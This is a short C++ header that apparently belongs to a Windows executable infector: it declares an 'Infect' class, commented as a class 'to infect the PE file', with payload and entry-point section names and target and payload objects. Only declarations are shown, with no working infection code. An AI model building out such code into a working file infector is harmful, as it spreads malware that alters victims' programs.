#pragma once
#include "pch.h"

#define PAYLOAD_SECTION "DEBUG"
#define EP_SECTION		"EP"

/*
	Purpose:

	Class to infect the PE file
*/
class Infect
{
public:
	static bool InfectPe();

	static Pe target;
	static Pe payload;
};